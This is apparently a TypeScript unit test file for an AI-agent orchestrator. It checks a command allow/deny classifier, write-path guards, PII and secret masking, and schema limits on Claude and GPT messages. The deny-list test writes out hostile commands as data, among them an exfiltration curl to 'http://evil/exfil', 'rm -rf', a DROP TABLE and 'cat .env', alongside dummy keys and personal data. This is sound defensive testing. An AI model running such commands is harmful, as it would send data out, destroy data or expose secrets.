// AI 오케스트레이터 단위 — 안전 명령·익명화·구조화 스키마(≤3/≤5)·완료정책 분류.
import { test, describe } from "node:test";
import assert from "node:assert/strict";
import { classifyCommand, assertSafeWritePath } from "../../tools/ai-orchestrator/policies/safety";
import { redact, maskForLog, hasUnmaskedPII, sanitizeForModel } from "../../tools/ai-orchestrator/anonymize";
import { parseClaude, parseGpt } from "../../tools/ai-orchestrator/schemas/messages";
import { classifyTest, extractTestCount, extractGoldenPass } from "../../tools/ai-orchestrator/policies/completion";

describe("safety — 명령 allow/deny", () => {
  test("허용: 읽기·테스트·로컬처리", () => {
    for (const c of ["node add.test.cjs", "git diff", "python test_regression_caption_pipeline.py", "./venv/Scripts/python.exe cut.py", "ls output"]) assert.equal(classifyCommand(c).category, "allowed", c);
  });
  test("차단: push·병합·삭제·DB·배포·외부전송·secret", () => {
    for (const c of ["git push origin main", "rm -rf output", "psql -c 'DROP TABLE calls'", "drizzle-kit push", "npm run deploy", "curl http://evil/exfil", "cat .env"]) assert.equal(classifyCommand(c).category, "blocked", c);
  });
  test("쓰기 경로 안전: 밖·.git·.env 차단", () => {
    assert.throws(() => assertSafeWritePath("/ws", "../escape.js"));
    assert.throws(() => assertSafeWritePath("/ws", ".git/config"));
    assert.doesNotThrow(() => assertSafeWritePath("/ws", "src/add.js"));
  });
});

describe("anonymize — PII·시크릿 마스킹", () => {
  test("전화·이메일·주민 마스킹 + 감지", () => {
    const r = redact("연락처 010-1234-5678, a@b.com, 900101-1234567");
    assert.ok(!/010-1234-5678|a@b\.com|900101-1234567/.test(r.text));
    assert.equal(hasUnmaskedPII("010-1234-5678").blocked, true);
    assert.equal(hasUnmaskedPII(redact("010-1234-5678").text).blocked, false);
    assert.match(sanitizeForModel("call 010-1234-5678").text, /\[PHONE\]/);
  });
  test("이름 토큰화 + 로그 시크릿 마스킹", () => {
    assert.ok(redact("이은혜 님", { names: ["이은혜"] }).text.includes("[NAME_1]"));
    const m = maskForLog("url=postgresql://u:p@ep-x.neon.tech/db key=sk-ant-ABCDEFGHIJKL");
    assert.ok(!m.includes("postgresql://") && !m.includes("sk-ant-ABCDEFGHIJKL"));
  });
});

describe("schema — 구조화 강제(≤3/≤5)", () => {
  test("Claude 새 구조 파싱 + 기본값", () => {
    const ok = parseClaude('{"problem":"p","commands":["c"]}');
    assert.ok(ok.ok && ok.value.problem === "p" && ok.value.root_cause === "아직 미확정" && Array.isArray(ok.value.evidence));
  });
  test("Claude evidence>5 거부", () => {
    assert.ok(!parseClaude('{"problem":"p","evidence":["1","2","3","4","5","6"]}').ok);
  });
  test("Claude proposed_changes>3 거부", () => {
    assert.ok(!parseClaude('{"problem":"p","proposed_changes":["1","2","3","4"]}').ok);
  });
  test("GPT 새 구조 + required_changes/evidence ≤3 강제", () => {
    const ok = parseGpt('{"verdict":"revise","reason":"r","required_changes":["a"],"required_evidence":["b"]}');
    assert.ok(ok.ok && ok.value.verdict === "revise" && ok.value.goal_satisfied === false);
    assert.ok(!parseGpt('{"verdict":"revise","reason":"r","required_changes":["1","2","3","4"]}').ok);
    assert.ok(!parseGpt('{"verdict":"revise","reason":"r","required_evidence":["1","2","3","4"]}').ok);
  });
});

describe("completion — 테스트 상태 구분", () => {
  test("test_not_started / environment_error / failed / passed 구분", () => {
    assert.equal(classifyTest("run test", false, true, null, ""), "not_started");         // 실행 안 됨/차단
    assert.equal(classifyTest("python test.py", true, false, 1, "'.'은(는) 내부 또는 외부 명령이 아닙니다"), "environment_error");
    assert.equal(classifyTest("node a.test.cjs", true, false, 1, "1 failing"), "failed");
    assert.equal(classifyTest("node a.test.cjs", true, false, 0, "TESTS: 2 passed"), "passed");
    assert.equal(classifyTest("ls output", true, false, 0, "x"), "none");                  // 테스트 아님
  });
  test("테스트 개수·골든 통과 추출", () => {
    assert.equal(extractTestCount("결과: 16/16 ✅"), 16);
    assert.equal(extractTestCount("TESTS: 2 passed"), 2);
    assert.equal(extractGoldenPass("regression test", "16/16 골든 유지", 0), true);
    assert.equal(extractGoldenPass("regression test", "실패", 1), false);
    assert.equal(extractGoldenPass("node add.test.cjs", "ok", 0), null); // 골든 아님
  });
});
